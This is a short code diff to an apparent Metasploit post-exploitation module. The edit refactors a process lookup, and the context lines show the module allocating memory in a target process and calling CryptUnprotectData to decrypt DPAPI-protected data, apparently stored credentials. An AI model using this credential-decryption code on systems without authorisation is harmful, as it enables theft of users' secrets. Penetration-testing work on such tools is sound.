@@ -53,7 +53,9 @@ class Metasploit3 < Msf::Post
     mem = process.memory.allocate(128)
     process.memory.write(mem, data)
 
-    if session.sys.process.each_process.find { |i| i["pid"] == pid} ["arch"] == "x86"
+    found_process = session.sys.process.each_process.find { |i| i["pid"] == pid}
+
+    if found_process["arch"] == "x86"
       addr = [mem].pack("V")
       len = [data.length].pack("V")
       ret = rg.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 8)
